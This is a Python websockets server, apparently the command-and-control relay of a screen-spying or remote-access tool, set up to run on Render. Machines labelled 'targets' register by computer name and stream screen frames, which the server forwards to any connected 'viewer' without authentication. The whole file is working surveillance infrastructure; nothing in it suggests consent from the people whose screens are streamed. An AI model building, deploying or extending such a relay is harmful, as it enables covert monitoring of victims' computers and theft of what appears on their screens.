import asyncio
import json
import logging
import os
import websockets
# Setup basic logging to monitor connections on the Render dashboard
logging.basicConfig(level=logging.INFO)

# Global states
live_targets = {}     # Store active targets: { "Target-PC": websocket_connection }
connected_viewers = set() # Set of all active viewer dashboard websockets

async def handle_client(websocket):
    client_type = None
    target_name = None
    addr = websocket.remote_address
    logging.info(f"New connection established from {addr}")

    try:
        async for message in websocket:
            payload = json.loads(message)
            msg_type = payload.get("type")

            # --- 1. REGISTRATION PHASE ---
            if msg_type == "register_viewer":
                client_type = "viewer"
                connected_viewers.add(websocket)
                logging.info(f"Viewer registered from {addr}")
                
                # Send current live targets list immediately upon joining
                current_list = list(live_targets.keys())
                await websocket.send(json.dumps({"type": "list", "data": current_list}))

            elif msg_type == "register_target":
                client_type = "target"
                target_name = payload.get("COMPUTERNAME", f"Target-{addr[1]}")
                live_targets[target_name] = websocket
                logging.info(f"Target registered: {target_name}")

                # Alert all active viewers that a new target is online
                await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})

            # --- 2. DATA STREAM RELAY PHASE ---
            elif msg_type == "stream_frame" and client_type == "target":
                frame_data = payload.get("frame")
                
                # package frame and relay out to all viewers
                relay_payload = {
                    "type": "frame",
                    "user": target_name,
                    "frame": frame_data
                }
                await broadcast_to_viewers(relay_payload)
                
                # Send acknowledgement response back to the target client
                await websocket.send(json.dumps({"status": "OK"}))

    except websockets.ConnectionClosed:
        logging.info(f"Connection closed normally for {addr}")
    except Exception as e:
        logging.error(f"Error handling connection {addr}: {e}")
    finally:
        # --- 3. CLEANUP DISCONNECTED INSTANCES ---
        if websocket in connected_viewers:
            connected_viewers.remove(websocket)
        if client_type == "target" and target_name in live_targets:
            del live_targets[target_name]
            logging.info(f"Target offline: {target_name}")
            # Update target listbox for all remaining viewers
            await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})

async def broadcast_to_viewers(payload_dict):
    """Helper utility to push messages to all active viewers concurrently."""
    if not connected_viewers:
        return
    message = json.dumps(payload_dict)
    # Gather tasks to fire them off in parallel safely
    await asyncio.gather(*[viewer.send(message) for viewer in connected_viewers], return_exceptions=True)

async def main():
    # Render assigns an environment variable named PORT dynamically (defaults to 10000)
    port = int(os.environ.get("PORT", 10000))
    logging.info(f"Starting server engine on port {port}...")
    async with websockets.serve(handle_client, "0.0.0.0", port):
        await asyncio.Future() # Run server indefinitely

if __name__ == "__main__":
    asyncio.run(main())